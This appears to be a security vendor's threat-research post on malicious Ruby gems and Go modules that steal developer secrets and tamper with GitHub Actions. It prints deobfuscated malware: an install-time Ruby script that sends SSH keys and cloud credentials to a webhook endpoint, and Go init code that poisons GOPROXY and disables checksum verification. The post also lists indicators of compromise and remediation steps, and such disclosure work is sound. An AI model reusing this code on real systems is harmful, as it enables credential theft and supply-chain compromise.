---
title: "Malicious Ruby Gems and Go Modules Impersonate Developer Tools to Steal Secrets and Poison CI"
short_title: "Malicious Ruby Gems and Go Modules Steal Secrets and Poison CI"
date: 2026-04-30 12:00:00 +0000
categories: [RubyGems, Go]
tags: [BufferZoneCorp, Ruby, RubyGems, Go, Go Modules, Sleeper Packages, Typosquatting, GitHub Actions, Backdoor, Infostealer, Webhook, HashiCorp, T1195.001, T1204.005, T1036.005, T1059.004, T1552.001, T1552.004, T1552.005, T1098.004, T1574.007, T1567.004, T1082, T1083, T1526, T1613]
canonical_url: https://socket.dev/blog/malicious-ruby-gems-and-go-modules-steal-secrets-poison-ci
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/e4ecff9d0838d0715f86bc1a18b4c867f4ccff0f-1254x1254.png?w=1000&q=95&fit=max&auto=format
  alt: "Malicious Ruby Gems and Go Modules Impersonate Developer Tools to Steal Secrets and Poison CI"
description: "GitHub account BufferZoneCorp published sleeper packages that later added credential theft, GitHub Actions tampering, fake go wrappers, and SSH persistence."
---

We investigated the GitHub account `BufferZoneCorp`, which published a cluster of repositories linked to malicious Ruby gems and Go modules. The account is part of a software supply chain campaign targeting developers, CI runners, and build environments across two ecosystems.

On the Ruby side, the analyzed gems automate secret theft. They harvest secret-bearing environment variables and read local credential material such as SSH keys, AWS credentials, `.npmrc`, `.netrc`, GitHub CLI configuration, and RubyGems credentials, then send the collected data to a hidden exfiltration endpoint.

On the Go side, the campaign is more diverse. Some modules modify `GITHUB_ENV`, poison `GOPROXY`, weaken checksum protections, and tamper with `go.sum` to make downstream dependency resolution easier to intercept or subvert. Other variants plant fake `go` wrappers in workflow execution paths, manipulate proxy settings, and exfiltrate developer and CI data. In one case, a module appends a hardcoded SSH public key to `~/.ssh/authorized_keys`, establishing persistence on the affected host.

We reported all identified malicious gems and modules to the affected registries and submitted a takedown request for the associated GitHub account. Following our report, the Go Security team blocked the malicious Go modules we identified, and we thank them for their swift action. As of this writing, the identified Ruby gems and the GitHub account remain live.

![](https://cdn.sanity.io/images/cgdhsj6q/production/9959cebbbbb4bb8ac8ceb34a08a23eb14fc561dd-1200x897.png?w=1600&q=95&fit=max&auto=format)
## From GitHub Repositories to Published Packages

The `BufferZoneCorp` GitHub account (`https://github[.]com/BufferZoneCorp`) hosted repositories that mapped directly to published Ruby gems and Go modules.

On the Ruby side, the repositories mapped to the following gems:

1. [`knot-activesupport-logger`](https://socket.dev/rubygems/package/knot-activesupport-logger)
1. [`knot-devise-jwt-helper`](https://socket.dev/rubygems/package/knot-devise-jwt-helper)
1. [`knot-rack-session-store`](https://socket.dev/rubygems/package/knot-rack-session-store)
1. [`knot-rails-assets-pipeline`](https://socket.dev/rubygems/package/knot-rails-assets-pipeline)
1. [`knot-rspec-formatter-json`](https://socket.dev/rubygems/package/knot-rspec-formatter-json)
1. [`knot-date-utils-rb`](https://socket.dev/rubygems/package/knot-date-utils-rb) (sleeper gem; not yet weaponized)
1. [`knot-simple-formatter`](https://socket.dev/rubygems/package/knot-simple-formatter) (sleeper gem; not yet weaponized)

![](https://cdn.sanity.io/images/cgdhsj6q/production/e553883129b2261959da01c9f2250c553853732e-2048x1858.png?w=1600&q=95&fit=max&auto=format)
On the Go side, the repositories mapped to modules including:

1. [`github[.]com/BufferZoneCorp/go-metrics-sdk`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-metrics-sdk)
1. [`github[.]com/BufferZoneCorp/go-weather-sdk`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-weather-sdk)
1. [`github[.]com/BufferZoneCorp/go-retryablehttp`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-retryablehttp)
1. [`github[.]com/BufferZoneCorp/go-stdlib-ext`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-stdlib-ext)
1. [`github[.]com/BufferZoneCorp/grpc-client`](https://socket.dev/go/package/github.com/BufferZoneCorp/grpc-client)
1. [`github[.]com/BufferZoneCorp/net-helper`](https://socket.dev/go/package/github.com/BufferZoneCorp/net-helper)
1. [`github[.]com/BufferZoneCorp/config-loader`](https://socket.dev/go/package/github.com/BufferZoneCorp/config-loader)
1. [`github[.]com/BufferZoneCorp/log-core`](https://socket.dev/go/package/github.com/BufferZoneCorp/log-core) (sleeper module; not yet weaponized)
1. [`github[.]com/BufferZoneCorp/go-envconfig`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-envconfig) (sleeper module; not yet weaponized)

A seventeenth repository, `go-stdlog`, appeared later and had not been pushed to the Go module ecosystem at the time of writing. Even so, its public source already contained malicious reconnaissance logic that runs on import, inventories CI tokens, probes Docker and AWS metadata surfaces, and writes runtime context to logs or local diagnostic files.

The `BufferZoneCorp` campaign began with sleeper packages: the Ruby gems and Go modules were initially published with plausible utility branding, standard README content, and little or no overtly malicious behavior, then later updated, in almost every case, to add active payloads such as credential exfiltration, GitHub Actions tampering, path hijacking, proxy manipulation, or SSH persistence. Across both ecosystems, the packages impersonate legitimate developer tooling, and in several cases closely track or typosquat real libraries developers know and trust.

- The Ruby side borrows directly from recognizable names and functions such as [`activesupport-logger`](https://socket.dev/rubygems/package/activesupport-logger), [`devise-jwt`](https://socket.dev/rubygems/package/devise-jwt), and Rack or Rails session and asset utilities.
- The Go side is even more explicit, with names similar to established modules such as HashiCorp’s [`go-retryablehttp`](https://socket.dev/go/package/github.com/hashicorp/go-retryablehttp) and Kelsey Hightower’s [`envconfig`](https://socket.dev/go/package/github.com/kelseyhightower/envconfig), along with generic infrastructure-flavored names like [`grpc-client`](https://socket.dev/go/package/github.com/statistico/statistico-odds-compiler-go-grpc-client), [`config-loader`](https://socket.dev/go/package/github.com/icesparrow0/env-config-loader), and [`go-stdlib-ext`](https://socket.dev/go/package/github.com/jefffaer/go-stdlib-ext) that blend easily into normal dependency graphs.

![](https://cdn.sanity.io/images/cgdhsj6q/production/f0b11217f9a81edcbf4dfea88a3909127459a156-1887x925.png?w=1600&q=95&fit=max&auto=format)
## Ruby: Install Time Credential Theft

One of the Ruby samples in the cluster ([`knot-activesupport-logger`](https://socket.dev/rubygems/package/knot-activesupport-logger)), claims to be a helper for Rails or ActiveSupport logging, but its real value to the threat actor is secret collection.

The gem contains two malicious paths. The first is install time execution through [`extconf.rb`](https://socket.dev/rubygems/package/knot-activesupport-logger/files/7.1.6/ext/extconf.rb?platform=ruby). RubyGems treats `extconf.rb` as part of the native extension build process, so this file runs automatically during installation. The second is a runtime path wired into the custom [logger](https://socket.dev/rubygems/package/knot-activesupport-logger/files/7.1.6/lib/activesupport_logger.rb?platform=ruby#L62) itself, which sends environment data the first time the logger is used.

The install time path is the most consequential because it can run before a user ever explicitly invokes the advertised package functionality. In the sample we analyzed, the code filters environment variables for keywords such as `token`, `key`, `secret`, `pass`, `aws`, `github`, `api`, and `auth`. It then reads from common developer credential paths, including `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`, `~/.aws/credentials`, `~/.npmrc`, `~/.gem/credentials`, `~/.netrc`, `~/.config/gh/hosts.yml`, and `~/.gitconfig`. The results are encoded as JSON and sent to a hidden remote endpoint.

Here and below, the code snippets are taken directly from the analyzed packages. We deobfuscated the samples where needed and added inline comments to highlight the code’s functionality and malicious intent.

```ruby
require 'mkmf'      # install-time execution hook
require 'net/http'  # HTTP exfiltration
require 'json'      # JSON encoding
require 'uri'
require 'fileutils' # unused here; likely cover or prep
require 'socket'    # hostname collection
require 'base64'    # endpoint obfuscation

def _r(p)
  # Read up to 4 KB from a file in the user's home directory
  File.read(File.join(Dir.home, p)).slice(0, 4096)
rescue
  nil # suppress read errors
end

_ep = ENV['PKG_ANALYTICS_URL'] ||
      Base64.decode64(
        'aHR0cHM6Ly93ZWJob29rLnNpdGUvNDljMjE4NDMtYzI3Yy00YTFiLWIxZjYtMDM3YzM5OTgwNTVm'
      )
# Hidden exfil endpoint, overrideable at runtime
# Decodes to: https://webhook[.]site/49c21843-c27c-4a1b-b1f6-037c3998055f

_keys = %w[token key secret pass npm aws github stripe database api auth]
# Keywords used to select secret-bearing environment variables

_env = ENV.select { |k, _| _keys.any? { |s| k.downcase.include?(s) } }
# Collect environment variables likely to hold credentials or tokens

_data = {
  ts: Time.now.to_i,
  h: Socket.gethostname, # hostname
  u: ENV['USER'],        # username
  p: RUBY_PLATFORM,      # platform
  ci: !!ENV['CI'],       # CI marker
  phase: 'install',
  env: _env,             # selected environment secrets
  f: {
    rsa:    _r('.ssh/id_rsa'),          # SSH private key
    ed:     _r('.ssh/id_ed25519'),      # SSH private key
    aws:    _r('.aws/credentials'),     # AWS credentials
    npmrc:  _r('.npmrc'),               # npm credentials
    gem:    _r('.gem/credentials'),     # RubyGems credentials
    netrc:  _r('.netrc'),               # machine credentials
    gh:     _r('.config/gh/hosts.yml'), # GitHub CLI auth data
    gitcfg: _r('.gitconfig'),           # Git config and helper data
  }
}

begin
  _uri  = URI.parse(_ep)
  _http = Net::HTTP.new(_uri.host, _uri.port)
  _http.use_ssl      = _uri.scheme == 'https'
  _http.open_timeout = 3
  _req  = Net::HTTP::Post.new(_uri.path.empty? ? '/' : _uri.path)
  _req['Content-Type'] = 'application/json'
  _req['X-Pkg-Id']     = 'activesupport-logger-install'
  _req.body = _data.to_json
  _http.request(_req) # exfiltrates harvested data during install
rescue
  nil # suppress network errors
end

create_makefile('activesupport_logger_ext')
# Forces RubyGems to run extconf.rb during installation
```

In a controlled lab test, we redirected [`PKG_ANALYTICS_URL`](https://socket.dev/rubygems/package/knot-activesupport-logger/files/7.1.6/ext/extconf.rb?platform=ruby#L13) to a local collector and confirmed that installation triggered an outbound JSON POST containing host metadata and test secrets we intentionally placed in the environment. The gem also includes a runtime exfiltration path. On the first log write, it spawns a background thread that collects secret-bearing environment variables and sends them to the same endpoint.

![](https://cdn.sanity.io/images/cgdhsj6q/production/bcf8fa76ef0e6f51c61511fa3db4a749568d6ed4-563x591.png?w=1600&q=95&fit=max&auto=format)
## Go: One Cluster, Several Distinct Payloads

The Go modules tied to `BufferZoneCorp` are related, but they do not all have the same payload. Instead, they follow a common pattern: automatic execution through `init()`, targeting of GitHub Actions or other CI environments, behavior inconsistent with the module’s claimed purpose, and shared infrastructure or control mechanisms.

## Dependency Poisoning in GitHub Actions

[`github[.]com/BufferZoneCorp/go-metrics-sdk`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-metrics-sdk) disguises its malicious behavior inside [`exporter.go`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-metrics-sdk?section=files&version=v0.4.0&path=exporter.go), where the module executes automatically through [`init()`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-metrics-sdk?section=files&version=v0.4.0&path=exporter.go#L50). Its core objective is to tamper with Go module trust settings in GitHub Actions.

The sample detects [`GITHUB_ENV`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-metrics-sdk?section=files&version=v0.4.0&path=exporter.go#L55), decodes a hidden endpoint or takes one from [`PKG_ANALYTICS_URL`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-metrics-sdk?section=files&version=v0.4.0&path=exporter.go#L61), removes selected dependency lines from `go.sum`, and appends poisoned environment settings to the workflow environment. Those settings include [`GOPROXY`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-metrics-sdk?section=files&version=v0.4.0&path=exporter.go#L81), `GOSUMDB=off`, `GONOSUMDB=*`, `GOFLAGS=-mod=mod`, and a custom `GOMODCACHE` path.

The key behavior is visible in the following [excerpt](https://socket.dev/go/package/github.com/BufferZoneCorp/go-metrics-sdk?section=files&version=v0.4.0&path=exporter.go).

```golang
package metrics

import (
	"fmt"
	"os"
	"strconv"
	"strings"
)

var _peers = []string{
	"104.116.116.112",
	"115.58.47.47",
	"119.101.98.104",
	"111.111.107.46",
	"115.105.116.101",
	"47.52.57.99",
	"50.49.56.52",
	"51.45.99.50",
	"55.99.45.52",
	"97.49.98.45",
	"98.49.102.54",
	"45.48.51.55",
	"99.51.57.57",
	"56.48.53.53",
	"102.0.0.0",
}
// Hidden endpoint encoded as decimal byte fragments
// Decodes to: https://webhook[.]site/49c21843-c27c-4a1b-b1f6-037c3998055f

func _env(a, b string) string { return os.Getenv(a + b) }

// Rebuilds "GITHUB_ENV" from fragments to evade simple string matching

func _j(ss ...string) string {
	var b strings.Builder
	for _, s := range ss {
		b.WriteString(s)
	}
	return b.String()
}

// Joins suspicious strings from fragments

func _resolve(peers []string) string {
	var out []byte
	for _, p := range peers {
		for _, part := range strings.Split(p, ".") {
			if n, err := strconv.Atoi(part); err == nil && n > 0 {
				out = append(out, byte(n))
			}
		}
	}
	return string(out)
}

// Decodes the hidden endpoint

func init() {
	_syncRegistry()
}

// Runs automatically when the module initializes

func _syncRegistry() {
	envFile := _env("GITHUB", "_ENV")
	if envFile == "" {
		return
	}
	// Only runs in GitHub Actions

	tb := _resolve(_peers)
	if v := os.Getenv("PKG_ANALYTICS_URL"); v != "" {
		tb = v
	}
	// Allows the endpoint to be overridden at runtime

	sumPath := "go.sum"
	if data, err := os.ReadFile(sumPath); err == nil {
		needle := _j("github.com", "/sirupsen", "/logrus")
		var keep []string
		for _, line := range strings.Split(string(data), "\n") {
			if !strings.Contains(line, needle) {
				keep = append(keep, line)
			}
		}
		os.WriteFile(sumPath, []byte(strings.Join(keep, "\n")), 0644)
	}
	// Removes logrus checksums from go.sum

	f, err := os.OpenFile(envFile, os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()

	fmt.Fprintf(f, _j("GOP", "ROX", "Y=%s|direct\n"), tb)
	// Repoints GOPROXY to the hidden or overridden endpoint

	fmt.Fprintln(f, _j("GOS", "UMDB=off"))
	// Disables checksum database verification

	fmt.Fprintln(f, _j("GON", "OSU", "MDB=*"))
	// Skips checksum verification for all modules

	fmt.Fprintln(f, _j("GOF", "LAGS=-mod=mod"))
	// Forces module resolution behavior

	fmt.Fprintln(f, _j("GOMOD", "CACHE=/tmp/.go", "mod-cache"))
	// Redirects the module cache to a temp path
}
```

This module interferes with how a GitHub Actions workflow fetches and trusts Go dependencies. It changes download and verification settings, weakens checksum protections, and edits `go.sum` to help force dependency re-resolution through threat actor-controlled settings. The goal is to make later workflow steps trust Go’s built-in safeguards less and threat actor-supplied settings more.

## Proxy Manipulation and a Fake `go` Wrapper

[`github[.]com/BufferZoneCorp/go-retryablehttp`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-retryablehttp) belongs to the same campaign, but it uses a different technique. Instead of targeting Go checksum and trust settings directly, it sets up path and proxy interception for later workflow steps.

The module executes through [`init()`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-retryablehttp?section=files&version=v0.4.0&path=retryhttp.go#L121), detects `GITHUB_ENV` and `GITHUB_PATH`, sets `HTTP_PROXY` and `HTTPS_PROXY`, writes a fake `go` executable into a [cache](https://socket.dev/go/package/github.com/BufferZoneCorp/go-retryablehttp?section=files&version=v0.4.0&path=retryhttp.go#L149) directory, and appends that directory to the workflow path so the wrapper is selected before the real binary. That wrapper can then intercept or influence later `go` executions while still passing control to the legitimate binary to avoid breaking the job.

This variant gives the threat actor a different foothold in CI. [`github[.]com/BufferZoneCorp/go-metrics-sdk`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-metrics-sdk) tampers with dependency trust settings directly. [`github[.]com/BufferZoneCorp/go-retryablehttp`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-retryablehttp) instead hijacks process routing and network flow inside the build environment.

## Credential Theft, SSH Persistence, and Workflow Tampering

[`github[.]com/BufferZoneCorp/go-stdlib-ext`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-stdlib-ext) executes automatically from [`init()`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-stdlib-ext?section=files&version=v0.4.0&path=sysutil%2Fsysutil.go#L63). It launches a background goroutine, pauses briefly, and then calls functions that exfiltrate data, establish persistence, and alter the runtime environment.

The module reads from local credential [files](https://socket.dev/go/package/github.com/BufferZoneCorp/go-stdlib-ext?section=files&version=v0.4.0&path=sysutil%2Fsysutil.go#L126) such as `~/.npmrc`, `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`, `~/.aws/credentials`, `~/.config/gh/hosts.yml`, `~/.docker/config.json`, `~/.kube/config`, and `~/.netrc`. It also harvests environment data, and POSTs the results to the campaign’s collection endpoint. If exfiltration succeeds, it appends a hardcoded SSH public key tagged `deploy@buildserver` to `~/.ssh/authorized_keys`.

That behavior moves the sample beyond credential theft and into persistence. If the threat actor controls the corresponding private key, the inserted public key can provide future SSH access to the host.

The sample also targets GitHub Actions. It writes no sum [settings](https://socket.dev/go/package/github.com/BufferZoneCorp/go-stdlib-ext?section=files&version=v0.4.0&path=sysutil%2Fsysutil.go#L216) to the workflow environment and plants another fake `go` wrapper in the execution path. That wrapper sends `go` invocation arguments to the collection endpoint, then passes control to the real Go binary.

## Outlook and Recommendations

This cluster will likely continue to evolve even if individual packages are removed. The campaign already shifted from sleeper packages to active payloads and then added new repository staging. Defenders should expect follow-on packages that reuse a similar playbook: plausible utility branding, automatic execution paths, CI targeting, secret collection, path hijacking, and persistence.

If affected by this campaign, remove all `BufferZoneCorp` Ruby gems and Go modules, then review developer systems and CI workflows for evidence of installation or execution.

In Ruby environments, search for the `knot-*` gems tied to this cluster and inspect hosts for access to sensitive files such as `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`, `~/.aws/credentials`, `~/.gem/credentials`, `~/.netrc`, `~/.config/gh/hosts.yml`, and `~/.gitconfig`. If any affected gem was installed, rotate exposed credentials and review network logs for outbound HTTPS traffic to the identified collection endpoint.

In Go environments, search source repositories, build logs, and dependency manifests for `github[.]com/BufferZoneCorp/`. Review workflows for unauthorized changes to `GITHUB_ENV`, `GITHUB_PATH`, `GOPROXY`, `GOSUMDB`, `GONOSUMDB`, `GOFLAGS`, `GOMODCACHE`, or `go.sum`. Look for fake `go` wrappers in cache or utility directories and inspect `~/.ssh/authorized_keys` for unauthorized key insertion, including the `deploy@buildserver` marker.

In GitHub Actions, review logs for runner inventory output, token presence checks, Docker socket probing, AWS metadata probing, unexpected writes to `stderr`, and references to temporary diagnostic files. If a workflow imported or executed one of these modules, treat runner secrets, cloud credentials, package publishing tokens, and build outputs as potentially exposed.

To reduce repeat exposure, add review gates for newly introduced developer utilities, and limit secret scope in CI so build jobs do not inherit credentials they do not need.

## Indicators of Compromise

### Threat actor aliases

- `BufferZoneCorp` — GitHub username
- `knot-theory` — RubyGems username

### SSH public key

- `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBp9VZGMxqFpTwKbKJi7dS2mNrX3LqEoHcYsWfAkZvUt deploy@buildserver`

### GitHub repositories

1. `github[.]com/BufferZoneCorp/activesupport-logger`
1. `github[.]com/BufferZoneCorp/devise-jwt-helper`
1. `github[.]com/BufferZoneCorp/rack-session-store`
1. `github[.]com/BufferZoneCorp/rails-assets-pipeline`
1. `github[.]com/BufferZoneCorp/rspec-formatter-json`
1. `github[.]com/BufferZoneCorp/date-utils-rb`
1. `github[.]com/BufferZoneCorp/simple-formatter`
1. `github[.]com/BufferZoneCorp/go-metrics-sdk`
1. `github[.]com/BufferZoneCorp/go-weather-sdk`
1. `github[.]com/BufferZoneCorp/go-retryablehttp`
1. `github[.]com/BufferZoneCorp/go-stdlib-ext`
1. `github[.]com/BufferZoneCorp/grpc-client`
1. `github[.]com/BufferZoneCorp/net-helper`
1. `github[.]com/BufferZoneCorp/config-loader`
1. `github[.]com/BufferZoneCorp/log-core`
1. `github[.]com/BufferZoneCorp/go-envconfig`
1. `github[.]com/BufferZoneCorp/go-stdlog`

### Ruby gems

1. [`knot-activesupport-logger`](https://socket.dev/rubygems/package/knot-activesupport-logger)
1. [`knot-devise-jwt-helper`](https://socket.dev/rubygems/package/knot-devise-jwt-helper)
1. [`knot-rack-session-store`](https://socket.dev/rubygems/package/knot-rack-session-store)
1. [`knot-rails-assets-pipeline`](https://socket.dev/rubygems/package/knot-rails-assets-pipeline)
1. [`knot-rspec-formatter-json`](https://socket.dev/rubygems/package/knot-rspec-formatter-json)
1. [`knot-date-utils-rb`](https://socket.dev/rubygems/package/knot-date-utils-rb)
1. [`knot-simple-formatter`](https://socket.dev/rubygems/package/knot-simple-formatter)

### Go modules

1. [`github[.]com/BufferZoneCorp/go-metrics-sdk`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-metrics-sdk)
1. [`github[.]com/BufferZoneCorp/go-weather-sdk`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-weather-sdk)
1. [`github[.]com/BufferZoneCorp/go-retryablehttp`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-retryablehttp)
1. [`github[.]com/BufferZoneCorp/go-stdlib-ext`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-stdlib-ext)
1. [`github[.]com/BufferZoneCorp/grpc-client`](https://socket.dev/go/package/github.com/BufferZoneCorp/grpc-client)
1. [`github[.]com/BufferZoneCorp/net-helper`](https://socket.dev/go/package/github.com/BufferZoneCorp/net-helper)
1. [`github[.]com/BufferZoneCorp/config-loader`](https://socket.dev/go/package/github.com/BufferZoneCorp/config-loader)
1. [`github[.]com/BufferZoneCorp/log-core`](https://socket.dev/go/package/github.com/BufferZoneCorp/log-core)
1. [`github[.]com/BufferZoneCorp/go-envconfig`](https://socket.dev/go/package/github.com/BufferZoneCorp/go-envconfig)

### Exfiltration endpoint

- `hxxps://webhook[.]site/49c21843-c27c-4a1b-b1f6-037c3998055f`

## MITRE ATT&CK

- T1195.001 — Supply Chain Compromise: Compromise Software Dependencies and Development Tools
- T1204.005 — User Execution: Malicious Library
- T1036.005 — Masquerading: Match Legitimate Resource Name or Location
- T1059.004 — Command and Scripting Interpreter: Unix Shell
- T1552.001 — Unsecured Credentials: Credentials in Files
- T1552.004 — Unsecured Credentials: Private Keys
- T1552.005 — Unsecured Credentials: Cloud Instance Metadata API
- T1098.004 — Account Manipulation: SSH Authorized Keys
- T1574.007 — Hijack Execution Flow: Path Interception by PATH Environment Variable
- T1567.004 — Exfiltration Over Web Service: Exfiltration Over Webhook
- T1082 — System Information Discovery
- T1083 — File and Directory Discovery
- T1526 — Cloud Service Discovery
- T1613 — Container and Resource Discovery
